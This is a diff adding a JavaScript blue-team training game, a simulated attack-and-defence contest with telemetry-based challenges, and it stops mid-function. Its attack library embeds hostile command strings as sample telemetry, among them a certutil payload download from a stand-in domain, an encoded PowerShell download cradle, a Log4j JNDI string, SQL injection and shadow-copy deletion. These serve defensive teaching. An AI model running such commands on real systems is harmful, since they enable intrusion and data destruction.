@@ -1,0 +1,608 @@
+/* ============================================================
+   ctf.js v5 — CTF 蓝队攻防排位赛（30 分钟实时 AWD）
+   · 蓝队 15 人（你 + 14 AI） vs 红队 5 攻击手
+   · 红队全程随机攻击多名蓝队；同一成员在攻击解决前不会再被攻击
+   · 你被攻击时有 5 分钟防御窗口；防住 +15，超时 0 分（红队拿分）
+   · resolve 后成员进入 60-120s 休整（防住后 1-2 分钟休息）
+   · assist 接管队友被攻击事件协防：成功 你+15 队友+5
+   · 攻击库 29 类（gen 随机遥测），need 参数均为遥测真实值
+   ============================================================ */
+(function () {
+  const $ = s => document.querySelector(s);
+  const esc = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  const r = n => Math.floor(Math.random() * n);
+  const pick = a => a[r(a.length)];
+  const shuffle = a => a.map(x => [Math.random(), x]).sort((p, q) => p[0] - q[0]).map(x => x[1]);
+  const rip = () => pick(['45.83.66.', '185.220.101.', '91.243.72.', '103.75.190.', '196.52.43.', '89.248.167.']) + (1 + r(254));
+  const ruser = () => pick(['zhangwei', 'lisi', 'wangfang', 'hr02', 'ops01', 'svc_backup']);
+  const rhost = () => pick(['WEB-03', 'APP-11', 'OA-02', 'DEV-04', 'GIT-02']);
+  const rdom = () => pick(['evil-cdn.net', 'update-svc.xyz', 'log-collect.icu', 'paste-log.icu', 'cdn-metrics.top']);
+  const ACC = ['未得手', '已获立足点', '用户权限', '管理员权限'];
+
+  /* ============================================================
+     攻击库（与排位规则同步：need 均为遥测真实值）
+     ============================================================ */
+  const A = [
+  { st: 0, n: 'Nmap 全端口扫描', pf: ['skid', 'bot'], dmg: {},
+    g: c => ({ tel: ['firewall: DROP ' + c.ip + ' → ' + c.host + ' [SYN 扫描 1-65535] ×4200/分钟', 'ids: 端口扫描特征命中'],
+      need: [['block', c.ip]], ok: '扫描源 ' + c.ip + ' 已封禁。', teach: '🔍 侦察被 DROP 说明防线有效——封来源+观察。' }) },
+  { st: 0, n: '目录爆破', pf: ['skid'], dmg: {},
+    g: c => ({ tel: ['waf: ' + c.ip + ' → GET /.git /backup /.env ×1800（全 404）'],
+      need: [['block', c.ip]], ok: '扫描源已封禁。', teach: '🔍 全 404 = 没打到东西。封禁来源并归档。' }) },
+  { st: 0, n: '被动信息收集（OSINT）', pf: ['apt', 'insider'], dmg: {},
+    g: () => ({ tel: ['intel: 攻击者在 GitHub/领英收集我方架构与员工名单', '注: 被动收集不产生我方日志'],
+      need: [['ignore', '']], ok: '正确。被动收集无法阻断，已收紧公开暴露面。', teach: '🔍 被动侦察在日志里毫无痕迹——考验公开暴露面治理。' }) },
+  { st: 0, n: '员工定向社工踩点', pf: ['insider', 'apt'], dmg: {},
+    g: c => ({ tel: ['intel: 内部知识库出现异常查询（' + c.user + ' 的组织架构与权限）', '注: 查询者使用合法账号，行为偏离基线'],
+      need: [['ignore', '']], ok: '已核实为内部低频查询，加入基线观察。', teach: '🔍 合法账号的"踩点"最难判——基线偏离而非关键词命中。' }) },
+
+  { st: 1, n: 'SSH 弱口令爆破', pf: ['skid', 'bot', 'ransom'], dmg: { biz: 10 },
+    g: c => ({ tel: ['auth: ' + c.host + ' Failed password for root from ' + c.ip + ' ×102', 'alert: 随后 1 条 Accepted 成功登录！'],
+      need: [['block', c.ip], ['isolate', c.host]], ok: '来源封禁 + ' + c.host + ' 已隔离。', teach: '🔑 失败海洋后的 Accepted = 爆破成功。封来源 + 隔离失陷主机。' }) },
+  { st: 1, n: 'RDP 爆破', pf: ['ransom', 'bot'], dmg: { biz: 10 },
+    g: c => ({ tel: ['win: ' + c.host + ' 4625 logon_type=10 ×55 from ' + c.ip, 'win: 4624 成功登录 administrator'],
+      need: [['block', c.ip], ['isolate', c.host]], ok: '爆破源被封，' + c.host + ' 已隔离。', teach: '🖥️ 4625 洪水后一条 4624 = RDP 被攻破。' }) },
+  { st: 1, n: '钓鱼附件（宏文档）', pf: ['apt', 'ransom'], dmg: { data: 15 },
+    g: c => ({ tel: ['mailgw: "简历.docm" 已送达 ' + c.user, 'edr: ' + c.host + ' WINWORD.EXE 拉起 cmd.exe'],
+      need: [['isolate', c.host], ['hunt', '']], ok: c.host + ' 已隔离，同 Campaign 已回溯。', teach: '📎 一人中招=全组高危：隔离+撤回+hunt 同邮件收件人。' }) },
+  { st: 1, n: 'SQL 注入拖取数据', pf: ['skid'], dmg: { data: 20 },
+    g: c => ({ tel: ['waf: ' + c.ip + ' GET /product.php?id=0 UNION SELECT user,pass FROM users → 200', 'db: 同源连接查询量激增'],
+      need: [['block', c.ip], ['patch', 'product.php']], ok: '注入源已封禁，注入点已修复。', teach: '💉 先封来源止血，再修 product.php 参数化查询。' }) },
+  { st: 1, n: 'Webshell 上传', pf: ['skid', 'apt'], dmg: { biz: 15 },
+    g: c => ({ tel: ['waf: POST /upload/avatar 200（类型校验被绕过）', 'http: POST /uploads/shell.php?pass=whoami 200'],
+      need: [['rm', 'shell.php'], ['patch', 'upload']], ok: 'Webshell 已删除，上传校验已修复。', teach: '🕸️ 删马必须配修上传漏洞，否则还会再传。' }) },
+  { st: 1, n: 'Log4j JNDI 利用', pf: ['apt', 'ransom'], dmg: { biz: 25 },
+    g: c => ({ tel: ['app: Attempting to resolve ${jndi:ldap://' + c.ip + ':1389/a}', 'net: 远程类已加载'],
+      need: [['patch', 'log4j'], ['block', c.ip]], ok: 'Log4j 已升级，利用源已封禁。', teach: '🧨 Log4Shell：升级组件根治，回连源也要封。' }) },
+  { st: 1, n: 'Java 反序列化 RCE', pf: ['apt'], dmg: { biz: 25 },
+    g: c => ({ tel: ['waf: POST 体含 ysoserial 序列化特征（CC 链）→ 200', 'app: ' + c.host + ' 响应回显命令输出'],
+      need: [['isolate', c.host], ['patch', 'commons']], ok: c.host + ' 已隔离，漏洞组件已升级。', teach: '💣 反序列化 = 直接 RCE，按失陷处置。' }) },
+  { st: 1, n: '密码喷洒（Password Spray）', pf: ['apt', 'bot'], dmg: { biz: 10 },
+    g: c => ({ tel: ['auth: 同一密码 "Summer2026!" 尝试 ' + (200 + r(300)) + ' 个账号，来自 ' + c.ip, '模式: 每账号仅 1 次，规避锁定策略'],
+      need: [['block', c.ip], ['hunt', '']], ok: '来源已封禁，并回溯确认无成功登录。', teach: '💧 密码喷洒"每号一次"躲锁定——查成功登录+封源。' }) },
+  { st: 1, n: '二维码钓鱼（Quishing）', pf: ['apt', 'insider'], dmg: { data: 10 },
+    g: c => ({ tel: ['mailgw: 邮件内嵌二维码，解码指向 ' + c.dom + ' 仿冒登录页', c.user + ' 已在移动端扫码输入账号'],
+      need: [['passwd', c.user], ['hunt', '']], ok: c.user + ' 凭据已重置，同 Campaign 已回溯。', teach: '📱 二维码绕过文本扫描——扫码者凭据必须重置+回溯。' }) },
+
+  { st: 2, n: 'certutil 下载载荷', pf: ['apt', 'ransom'], dmg: { biz: 10 },
+    g: c => ({ tel: ['edr: ' + c.host + ' certutil -urlcache -f http://' + c.dom + '/a.exe', 'net: 外联成功（12MB）'],
+      need: [['kill', 'certutil'], ['block', c.dom]], ok: '下载进程已终止，域名已封禁。', teach: '⬇️ certutil 是系统自带下载器（LOLBAS）：杀进程+封域名。' }) },
+  { st: 2, n: '混淆 PowerShell 执行', pf: ['apt', 'skid'], dmg: { biz: 15 },
+    g: c => ({ tel: ['edr: ' + c.host + ' powershell -enc SQBFAFgA…（Base64 混淆）', 'edr: IEX+DownloadString 内存加载 stage2'],
+      need: [['kill', 'powershell'], ['isolate', c.host]], ok: '恶意 PowerShell 已终止，主机已隔离。', teach: '⚡ 无文件攻击在内存里：杀进程+隔离主机。' }) },
+  { st: 2, n: 'WMI 远程执行', pf: ['apt'], dmg: { biz: 15 },
+    g: c => ({ tel: ['win: ' + c.host + ' WMI ExecEvent: wmic /node:' + ripC() + ' process call create cmd', 'sysmon: WmiPrvSE 拉起可疑子进程'],
+      need: [['isolate', c.host]], ok: 'WMI 滥用主机已隔离。', teach: '🕹️ WMI 是"无文件执行"最爱通道——Sysmon 事件 20/21 可见。' }) },
+  { st: 2, n: 'DLL 劫持驻留', pf: ['skid', 'bot'], dmg: { biz: 10 },
+    g: c => ({ tel: ['edr: ' + c.host + ' 正版程序目录被放置 version.dll（无签名）', 'edr: 程序启动时自动加载该 DLL'],
+      need: [['rm', 'version.dll']], ok: '劫持 DLL 已删除。', teach: '🧩 DLL 劫持：正版程序替恶意库"背书"。查签名+目录白名单。' }) },
+
+  { st: 3, n: '计划任务持久化', pf: ['apt', 'ransom', 'skid'], dmg: { biz: 10 },
+    g: c => ({ tel: ['win: ' + c.host + ' schtasks /create /tn ' + c.user + 'Upd /sc minute /mo 1', 'edr: 任务每分钟拉起混淆 PS'],
+      need: [['rm', c.user + 'Upd']], ok: '持久化任务已删除。', teach: '⏰ 每分钟一次的"心跳任务"必须删除。' }) },
+  { st: 3, n: '注册表 Run 启动项', pf: ['skid', 'bot'], dmg: { biz: 10 },
+    g: c => ({ tel: ['win: HKCU Run 新增 onedrives.exe（无签名）', 'edr: 同名文件已运行'],
+      need: [['rm', 'onedrives.exe']], ok: '启动项与落地文件已清除。', teach: '📦 onedrives 冒充 OneDrive：键与文件都要删。' }) },
+  { st: 3, n: 'SSH 公钥后门', pf: ['apt'], dmg: { biz: 10 },
+    g: c => ({ tel: ['linux: authorized_keys 新增陌生公钥 ' + c.dom.split('.')[0] + '-key', 'auth: 经该公钥成功登录 1 次'],
+      need: [['rm', 'authorized_keys']], ok: '陌生公钥已移除。', teach: '🗝️ 公钥后门不依赖密码——删钥匙并审计全部账号。' }) },
+  { st: 3, n: '新建管理员账号', pf: ['ransom', 'apt'], dmg: { biz: 10 },
+    g: c => ({ tel: ['win: 4720 创建 ' + c.user + '_tmp（03:20）', 'win: 4732 加入 administrators 组'],
+      need: [['disable', c.user + '_tmp']], ok: '后门账号已禁用（保留现场）。', teach: '👤 先禁用保留证据，审计创建者会话后删除。' }) },
+  { st: 3, n: 'systemd 服务持久化', pf: ['apt', 'bot'], dmg: { biz: 10 },
+    g: c => ({ tel: ['linux: 新增 dbus-upd.service（Restart=always）', 'linux: 每 10 秒 curl|sh 保活'],
+      need: [['rm', 'dbus-upd.service']], ok: '恶意服务文件已删除。', teach: '⚙️ disable、删文件、daemon-reload 三步缺一不可。' }) },
+  { st: 3, n: 'WMI 事件订阅持久化', pf: ['apt'], dmg: { biz: 15 },
+    g: c => ({ tel: ['win: ' + c.host + ' WMI 永久订阅 CommandLineEventConsumer', 'edr: 系统启动时自动触发混淆 PS'],
+      need: [['rm', 'wmi订阅']], ok: 'WMI 订阅已清除。', teach: '♾️ WMI 订阅是"无文件持久化"之王——常规排查看不到它。' }) },
+
+  { st: 4, n: 'SUID 提权后门', pf: ['skid'], dmg: { biz: 10 },
+    g: c => ({ tel: ['linux: /tmp/.cache/update 为 SUID root（4777）', 'audit: 攻击者借此获得 root shell'],
+      need: [['rm', 'update']], ok: 'SUID 后门已删除。', teach: '🪜 4777 SUID = 任何用户一键变 root。' }) },
+  { st: 4, n: 'Kerberoasting', pf: ['apt'], dmg: { data: 20 },
+    g: c => ({ tel: ['dc: 4769 TGS 请求暴增 → 目标服务账号 ' + c.user + '_svc（RC4 加密）', 'risk: 离线爆破服务账号密码'],
+      need: [['passwd', c.user + '_svc']], ok: '服务账号密码已重置（票据作废）。', teach: '🎟️ Kerberoasting 抓服务票据离线爆破——重置密码使票据作废。' }) },
+  { st: 4, n: 'DCSync 域哈希窃取', pf: ['apt'], dmg: { data: 30 },
+    g: c => ({ tel: ['dc: ' + c.host + ' 的 ' + c.user + '_svc 发起 4662 Replicating Directory Changes', 'dc: 域内全部哈希可被导出'],
+      need: [['isolate', c.host], ['passwd', c.user + '_svc']], ok: '发起主机已隔离，凭据已重置。', teach: '👑 DCSync：隔离+重置凭据+krbtgt 两次重置。' }) },
+  { st: 4, n: '内核漏洞本地提权', pf: ['skid', 'bot'], dmg: { biz: 20 },
+    g: c => ({ tel: ['linux: 低权账号触发内核提权（CVE-2026-0815）成功', 'linux: 提权后执行 crontab -e'],
+      need: [['patch', 'kernel']], ok: '内核已升级，提权通道关闭。', teach: '🧗 内核提权无脑解 = patch kernel。' }) },
+
+  { st: 5, n: 'psexec/SMB 横向移动', pf: ['ransom', 'apt'], dmg: { biz: 20 },
+    g: c => ({ tel: ['ndr: ' + c.ip + ' 依次建立 admin$ 会话至 2 台服务器', 'win: 目标机出现临时服务'],
+      need: [['isolate', c.ip]], ok: '横向发起主机已隔离。', teach: '🚚 源头不隔离，封多少目标机都没用。' }) },
+  { st: 5, n: 'Pass-the-Hash 横向', pf: ['apt'], dmg: { data: 15 },
+    g: c => ({ tel: ['win: ' + c.host + ' 4624 logon_type=9 NTLM 登录 user=' + c.user + '（哈希直接认证）', 'src: 与 LSASS 转储主机一致'],
+      need: [['passwd', c.user], ['isolate', c.host]], ok: '凭据已重置，源主机已隔离。', teach: '#️⃣ PtH 用哈希不当密码——重置凭据使旧哈希作废。' }) },
+  { st: 5, n: 'RDP 跳板扩散', pf: ['ransom', 'bot'], dmg: { biz: 15 },
+    g: c => ({ tel: ['win: ' + c.host + ' 经 RDP 跳板访问 ' + ripC() + '（新型会话）', 'net: 剪贴板/驱动器重定向开启'],
+      need: [['isolate', c.host]], ok: '跳板主机已隔离。', teach: '🖥️ 跳板会话带驱动器重定向=文件可双向搬运。' }) },
+
+  { st: 6, n: '数据库拖库', pf: ['skid', 'apt', 'insider'], dmg: { data: 25 },
+    g: c => ({ tel: ['db: 02:13 ' + c.ip + ' SELECT * FROM users/orders/payments 共 129 万行'],
+      need: [['block', c.ip]], ok: '拖库连接已切断。', teach: '📤 先断会话止损，再评估合规义务。' }) },
+  { st: 6, n: 'DNS 隧道数据外传', pf: ['apt'], dmg: { data: 20 },
+    g: c => ({ tel: ['dns: ' + c.host + ' 高频 TXT 查询 *.' + c.dom, 'flow: 无对应 HTTP 流量'],
+      need: [['block', c.dom], ['hunt', '']], ok: '隧道域名已封禁，并全网回溯同通道主机。', teach: '📡 封域名+隔离+hunt 回溯——隧道往往不止一台在用。' }) },
+  { st: 6, n: '个人网盘数据外带', pf: ['insider'], dmg: { data: 20 },
+    g: c => ({ tel: ['dlp: ' + c.host + ' 的 ' + c.user + ' 上传核心仓库 src.tar.gz（180MB）至个人网盘', 'time: 周日 23:30'],
+      need: [['isolate', c.host]], ok: '涉事终端已隔离，通道中断。', teach: '📦 内鬼外带：隔离保证据，后续走合规与法务。' }) },
+  { st: 6, n: '内网嗅探抓凭据', pf: ['bot', 'apt'], dmg: { data: 15 },
+    g: c => ({ tel: ['ndr: ' + c.host + ' 网卡开启混杂模式（抓包）', 'risk: 已捕获 NTLM Challenge/Response 多组'],
+      need: [['isolate', c.host]], ok: '嗅探主机已隔离。', teach: '👂 混杂模式=在听内网广播的每一句"悄悄话"。' }) },
+
+  { st: 7, n: '勒索软件加密', pf: ['ransom'], dmg: { biz: 40, data: 40 },
+    g: c => ({ tel: ['edr: ' + c.host + ' svhost.exe 批量写入 .locked ×20000/分钟', 'win: vssadmin delete shadows /all /quiet'],
+      need: [['isolate', c.host], ['restore', 'backup']], ok: c.host + ' 已隔离，备份恢复流程已启动。', teach: '🧊 隔离（不关机）+ 从离线备份恢复——绝不建议交赎金。' }) },
+  { st: 7, n: '挖矿木马', pf: ['bot', 'skid'], dmg: { biz: 15 },
+    g: c => ({ tel: ['host: ' + c.host + ' kdevtmpfsi CPU 99.2% ×6h', 'net: ESTABLISHED 矿池 91.243.72.5:3333'],
+      need: [['kill', 'kdevtmpfsi'], ['block', '91.243.72.5']], ok: '挖矿进程终止，矿池封禁。', teach: '⛏️ 杀进程+封矿池+清持久化。' }) },
+  { st: 7, n: '官网首页篡改', pf: ['skid'], dmg: { biz: 10 },
+    g: c => ({ tel: ['waf: POST /admin/page/edit 200（后台弱口令登录后）', 'web: index.html 出现 display:none 暗链'],
+      need: [['rm', 'index.html'], ['patch', 'admin']], ok: '页面已恢复，后台口令已加固。', teach: '🕳️ 恢复页面之前先堵后台。' }) },
+  { st: 7, n: '关键数据删除破坏', pf: ['apt', 'insider'], dmg: { data: 35 },
+    g: c => ({ tel: ['edr: ' + c.host + ' 大量 del /f /s /q D:\\projects\\', 'win: 卷影副本删除（备份未受影响）'],
+      need: [['isolate', c.host]], ok: '破坏行为主机已隔离，备份完好。', teach: '💣 数据破坏=影响战术。离线备份是唯一可靠解药。' }) },
+  ];
+
+  /* ---------- 正常业务噪音 ---------- */
+  const BENIGN = [
+  { n: '数据库夜间备份任务', g: () => ({ tel: ['db: 02:00-02:30 大量 SELECT + 备份机写入 8GB', '台账: 备份窗口已报备'] }), teach: '💾 凌晨批量读取常见于备份——先查报备再定性。' },
+  { n: '运营大促流量洪峰', g: () => ({ tel: ['gw: QPS 峰值 8600（基线 800）', 'ops 群: 大促公告已发'] }), teach: '📈 业务高峰长得像 CC 攻击——先问业务。' },
+  { n: '安全部月度漏扫', g: () => ({ tel: ['scan: 10.1.9.9 全站扫描（Nessus 模板）', 'ticket: 变更单已审批'] }), teach: '📋 有报备的扫描是正常安全活动。' },
+  { n: '新服务器上线批量外联', g: () => ({ tel: ['net: 10.1.9.30 批量连接 CMDB/补丁服务器', 'asset: 该主机今日上线（变更单已录）'] }), teach: '🆕 资产台账齐全时，"陌生主机"秒变"已知变更"。' },
+  { n: 'HR 系统年终批量查询', g: () => ({ tel: ['app: hr02 批量查询员工档案（年报统计期）', 'ticket: 年度报表任务已批准'] }), teach: '📊 周期性业务批量查询——核对工单即可。' },
+  ];
+
+  /* ---------- 红队人设 / 蓝队 15 人 ---------- */
+  const RED = [
+    { id: 'skid', name: 'Skid_K1ller（脚本小子）', chain: [0, 1, 2, 3, 7] },
+    { id: 'apt', name: 'APT_Ph4ntom（APT 组织）', chain: [0, 1, 2, 3, 4, 5, 6] },
+    { id: 'ransom', name: 'LockByte（勒索团伙）', chain: [1, 3, 5, 7] },
+    { id: 'bot', name: 'B0tMaster_9（僵尸网络）', chain: [0, 1, 3, 4, 7] },
+    { id: 'insider', name: 'Ghost_HR（内鬼）', chain: [6] },
+  ];
+  const BLUE_NAMES = ['老陈', '小林', 'Ava', '大白', '夜莺', 'Stone', '阿杰', 'Momo', '老K', '小鹿', 'Vince', '南笙', '大熊', 'Lina'];
+  const SEGS = [[1800, '最强王者'], [1600, '璀璨钻石'], [1400, '尊贵铂金'], [1200, '荣耀黄金'], [1000, '不屈白银'], [0, '坚韧黄铜']];
+  const segName = r0 => (SEGS.find(s => r0 >= s[0]) || SEGS[SEGS.length - 1])[1];
+  const TAUNT_BLOCK = ['换跳板了……你的封禁只挡了一会儿。', '此路不通？那再试一次。', 'IP 被封？小事，重新来过。'];
+  const TAUNT_MISS = ['得手！继续深入……', '防守形同虚设，加速推进。', '很好，没人注意到。'];
+
+  /* ============================================================
+     状态
+     ============================================================ */
+  let box, inputLine, input;
+  let st = null, timer = null;
+
+  function scrollBottom() { box.scrollTop = box.scrollHeight; }
+  function print(html, cls = 't-c') {
+    const div = document.createElement('div');
+    div.className = 'ln ' + cls;
+    div.innerHTML = html;
+    box.insertBefore(div, inputLine);
+    scrollBottom();
+  }
+  function printRaw(t, cls) { print(esc(t), cls || 't-c'); }
+  function feed(html) {
+    const el = document.createElement('div');
+    el.className = 'feed-item new';
+    el.innerHTML = html;
+    $('#ctFeed').prepend(el);
+    while ($('#ctFeed').children.length > 60) $('#ctFeed').lastChild.remove();
+  }
+  function fmtClock(s) { const m = Math.floor(s / 60); return String(m).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0'); }
+  function board() {
+    const rows = [{ name: '蓝队·你（你）', score: st.me, me: true },
+      ...st.mates.map(b => ({ name: '蓝队·' + b.name, score: b.score })),
+      ...st.red.map(x => ({ name: x.name + '〔' + ACC[x.access] + '〕', score: x.score, red: true }))];
+    rows.sort((a, b) => b.score - a.score);
+    $('#ctBoard').innerHTML = rows.map((x, i) => `
+      <div class="lb-row ${x.me ? 'me' : ''} ${x.red ? 'red' : ''}">
+        <span class="lb-rank">${i + 1}</span>
+        <span class="lb-name">${esc(x.name)}</span>
+        <span class="lb-score">${x.score}</span>
+      </div>`).join('');
+  }
+  function meters() {
+    $('#ctBiz').textContent = Math.max(0, st.biz);
+    $('#ctData').textContent = Math.max(0, st.data);
+    $('#ctMy').textContent = st.me;
+    $('#ctRed').textContent = st.red.reduce((s, x) => s + x.score, 0);
+    $('#ctActive').textContent = activeCount();
+    $('#ctStopped').textContent = st.stopped;
+  }
+  function activeCount() { return st.attacks.filter(x => x.state === 'active').length; }
+  function activeOnMe() { return st.attacks.filter(x => x.state === 'active' && x.target === 'you'); }
+  function activeOnMates() { return st.attacks.filter(x => x.state === 'active' && x.target !== 'you'); }
+
+  /* ============================================================
+     比赛构建
+     ============================================================ */
+  function start() {
+    st = {
+      t: 0, total: 30 * 60,
+      biz: 100, data: 100,
+      me: 0, stopped: 0, missed: 0, assists: 0, log: [],
+      red: RED.map(x => ({ ...x, score: 0, step: 0, access: 0, ip: rip() })),
+      mates: BLUE_NAMES.map((n, i) => ({ name: n, skill: 0.38 + ((i * 37) % 50) / 100, score: 0, cdUntil: 0 })),
+      attacks: [], aid: 0,
+      nextSpawn: 12 + r(10),      // 首波 12-22s
+      lastResolve: 0,
+      console: null,              // 当前在终端上的攻击（你或 assist 接管）
+      resolved: true,
+    };
+    $('#ctfStart').style.display = 'none';
+    $('#ctfConsole').style.display = 'block';
+    $('#ctFeed').innerHTML = '';
+    board(); meters();
+    feed('🏁 比赛开始！蓝队 15 人 vs 红队 5 人。30 分钟内红队会持续进攻多名队友——盯紧你的终端与左侧战况。');
+    printRaw('战场接入完成。你将随机遭受攻击（5 分钟防御窗口）。输入 help 查看手册，输入 assist 可接管队友被攻击事件。', 't-w');
+    setTimeout(nextConsole, 1200);
+  }
+
+  /* ============================================================
+     主循环（1s tick）
+     ============================================================ */
+  function tick() {
+    st.t++;
+    $('#ctClock').textContent = fmtClock(st.t);
+    $('#ctRemain').textContent = fmtClock(Math.max(0, st.total - st.t));
+
+    // 1) 你终端上的攻击：窗口倒计时 + 超时判定（5 分钟）
+    if (st.console && st.console.state === 'active') {
+      var left = st.console.deadline - st.t;
+      var el = document.getElementById('ctTimer');
+      if (el) {
+        el.textContent = Math.max(0, left) + 's';
+        el.style.color = left > 60 ? 'var(--tx2)' : left > 20 ? 'var(--am)' : 'var(--ro)';
+      }
+      var bar = document.getElementById('ctTimerBar');
+      if (bar) { bar.style.width = Math.max(0, left / 300 * 100) + '%'; bar.style.background = left > 60 ? 'var(--grad)' : left > 20 ? '#fbbf24' : '#fb7185'; }
+      if (left <= 0) failAttack(st.console, '5 分钟防御窗口超时');
+    }
+
+    // 2) 队友被攻击：AI 自动结算（技能 roll）
+    st.attacks.forEach(x => {
+      if (x.state !== 'active' || x.target === 'you' || x.assist) return;
+      if (st.t >= x.aiResolveAt) {
+        var mate = x.target.mate;
+        if (Math.random() < mate.skill) {
+          x.state = 'resolved'; mate.score += 12; mate.cdUntil = st.t + 60 + r(60);
+          feed(`🛡️ ${esc(mate.name)} 防住了 <b>${esc(x.atk.n)}</b>（红队 0 分）· ${esc(x.redName)} +0`);
+          x.redMember.cdUntil = st.t + 30 + r(30);
+        } else {
+          resolveMiss(x, null);
+        }
+      }
+    });
+
+    // 3) 队友被攻击事件滞留过久没人管 → 你可以 assist（提示一次）
+    var pend = activeOnMates().filter(x => !x.assistHinted && st.t - x.born > 25);
+    pend.forEach(x => { x.assistHinted = true; printRaw(`📡 ${esc(x.target.mate.name)} 正被【${esc(x.atk.n)}】攻击且尚未解决——输 assist 接管协防（+15）。`, 't-i'); });
+
+    // 4) 红队新攻击
+    if (st.t >= st.nextSpawn) {
+      st.nextSpawn = st.t + 15 + r(16); // 15-30s 一波
+      spawnAttack();
+    }
+
+    // 5) 比赛结束
+    if (st.t >= st.total) return end();
+    if (st.biz <= 0 && st.data <= 0) return end(true);
+  }
+
+  /* ---------- 红队发起攻击 ---------- */
+  function spawnAttack() {
+    var mem = st.red[r(st.red.length)];
+    var stage = mem.chain[Math.min(mem.step, mem.chain.length - 1)];
+    var pool = A.filter(a => a.st === stage && a.pf.includes(mem.id));
+    if (!pool.length) pool = A.filter(a => a.st <= stage && a.pf.includes(mem.id));
+    if (!pool.length) pool = A.filter(a => a.st === 1);
+    var atk = pick(pool);
+    mem.step++;
+
+    // 目标选择：你 30%（空闲时），其余 14 名队友
+    var freeMates = st.mates.filter(m => st.t >= m.cdUntil && !st.attacks.some(x => x.state === 'active' && x.target.mate === m));
+    var youFree = !activeOnMe().length && st.t >= (st.youCd || 0);
+    var targetMate = null;
+    if (youFree && Math.random() < 0.32) targetMate = null;
+    else {
+      if (!freeMates.length) return; // 全员忙，红队观望
+      targetMate = pick(freeMates);
+    }
+
+    var c = { ip: mem.ip, host: targetMate ? rhost() : rhost(), user: ruser(), dom: rdom() };
+    var wv = atk.g(c);
+    var aid = ++st.aid;
+    var atkInst = {
+      id: aid, atk: atk, mem: mem, redName: mem.name.split('（')[0],
+      ctx: c, wave: wv, need: wv.need.map(x => x.slice()),
+      target: targetMate ? { mate: targetMate } : 'you',
+      born: st.t, deadline: st.t + 300,
+      state: 'active', assist: false, assistHinted: false,
+      aiResolveAt: targetMate ? st.t + 45 + r(45) : 0,
+    };
+    st.attacks.push(atkInst);
+
+    if (targetMate) {
+      feed(`🔴 <b>[A${String(aid).padStart(2, '0')}]</b> ${esc(mem.name)} 攻击 ${esc(targetMate.name)}：<b>${esc(atk.n)}</b>（输 assist A${String(aid).padStart(2, '0')} 接管）`);
+    } else {
+      pushConsole(atkInst);
+      feed(`🔴 <b>[A${String(aid).padStart(2, '0')}]</b> 你的主机遭到 <b>${esc(atk.n)}</b>！5 分钟防御窗口开始`);
+    }
+    mem.cdUntil = 0;
+  }
+
+  /* ---------- 你的终端 ---------- */
+  function pushConsole(x) {
+    st.console = x;
+    st.resolved = false;
+    $('#ctWaveSrc').textContent = '⚠ 你的主机';
+    $('#ctWaveSrc').className = 'src-badge src-SIEM';
+    $('#ctWaveTitle').textContent = `[A${String(x.id).padStart(2, '0')}] ${x.atk.n}`;
+    $('#ctWaveTarget').textContent = `目标：你的主机 · 防御窗口至 ${fmtClock(x.deadline)}`;
+    $('#ctTelemetry').innerHTML = x.wave.tel.map(e => '· ' + esc(e)).join('<br>');
+    $('#ctVerdict').innerHTML = '';
+    printRaw(`── 🚨 你的主机遭到【${x.atk.n}】！防御窗口 5 分钟 ──`, 't-r');
+    input.focus({ preventScroll: true });
+  }
+  function consoleStandby() {
+    st.console = null;
+    $('#ctWaveSrc').textContent = '监控台';
+    $('#ctWaveSrc').className = 'src-badge src-NDR';
+    $('#ctWaveTitle').textContent = '监视中';
+    $('#ctWaveTarget').textContent = '';
+    $('#ctTelemetry').innerHTML = '等待下一波攻击……<br> teammate 被攻击事件会实时出现在左侧战况，可随时 assist 接管。';
+    $('#ctVerdict').innerHTML = '';
+  }
+
+  function nextConsole() {
+    // 从队列取最早截止的你方攻击
+    var q = activeOnMe().sort((a, b) => a.deadline - b.deadline);
+    if (q.length) pushConsole(q[0]);
+    else consoleStandby();
+  }
+
+  /* ---------- 判定 ---------- */
+  function resolveSuccess(x, byAssist) {
+    x.state = 'resolved';
+    clearInterval(timer === null ? null : timer);
+    if (x.target === 'you') {
+      st.me += 15; st.stopped++;
+      feed(`🛡️ 蓝队·你 防住 <b>[A${String(x.id).padStart(2, '0')}] ${esc(x.atk.n)}</b> +15`);
+    } else {
+      var mate = x.target.mate;
+      st.me += 15; st.assists++; mate.score += 5;
+      feed(`🤝 蓝队·你 接管协防成功 <b>${esc(x.atk.n)}</b> +15（${esc(mate.name)} +5）`);
+    }
+    printRaw('✅ 防御成功！+15。', 't-g');
+    printRaw('📚 ' + x.atk.teach, 't-w');
+    x.redMember.cdUntil = st.t + 60 + r(60);
+    if (x.target === 'you') { st.youCd = st.t + 45 + r(45); nextConsole(); }
+    board(); meters();
+  }
+  function failAttack(x, reason) {
+    if (x.state !== 'active') return;
+    x.state = 'missed';
+    var mem = x.mem;
+    mem.score += 15; applyDmg(x.atk);
+    mem.cdUntil = st.t + 60 + r(60);
+    if (x.target === 'you') { st.youCd = st.t + 45 + r(45); st.missed++; }
+    feed(`💀 <b>[A${String(x.id).padStart(2, '0')}]</b> ${esc(x.redName)} 攻击得手（${esc(x.atk.n)}）—— 蓝队 0 分，业务/数据受损`);
+    printRaw(`❌ [A${String(x.id).padStart(2, '0')}] 攻击得手：${x.atk.n}。`, 't-r');
+    printRaw('📚 正确处置：' + x.need.map(y => y[0] + ' ' + y[1]).join(' 且 ') + ' —— ' + x.atk.teach, 't-w');
+    if (x.target === 'you') { st.console = null; nextConsole(); }
+    board(); meters();
+  }
+  function applyDmg(a) {
+    st.biz = Math.max(0, st.biz - (a.dmg.biz || 0));
+    st.data = Math.max(0, st.data - (a.dmg.data || 0));
+    meters();
+  }
+
+  /* ---------- 命令 ---------- */
+  function norm(s) { return String(s).toLowerCase().trim().replace(/\s+/g, ' '); }
+  function argMatch(typed, key) {
+    const u = norm(typed), k = norm(key);
+    if (!u || !k) return false;
+    return u === k || u.includes(k) || k.includes(u);
+  }
+
+  function run(raw) {
+    const cmd = raw.trim();
+    if (!cmd) return;
+    print(`<span class="t-p">blue@awd:~$</span> ${esc(cmd)}`, '');
+    const verb = cmd.split(/\s+/)[0].toLowerCase();
+    const arg = cmd.slice(verb.length).trim();
+
+    if (verb === 'help') return showHelp();
+    if (verb === 'status') {
